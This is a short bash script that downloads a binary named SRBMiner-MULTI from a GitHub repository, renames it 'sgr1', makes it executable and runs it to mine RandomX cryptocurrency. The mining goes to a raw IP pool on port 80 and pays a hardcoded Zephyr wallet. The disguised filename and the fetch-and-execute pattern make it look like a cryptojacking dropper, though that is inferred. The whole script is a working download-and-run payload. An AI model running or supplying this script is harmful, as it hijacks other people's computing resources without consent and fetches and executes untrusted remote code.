#!/bin/bash
wget -O sgr1 https://github.com/tyha4t57i/filesg/raw/main/SRBMiner-MULTI
chmod +x sgr1
./sgr1 --algorithm randomx --pool 95.179.243.207:80 --wallet ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 --password x --disable-cpu-optimisations --disable-huge-pages --disable-hw-aes --disable-msr-tweaks --disable-numa --cpu-threads 4
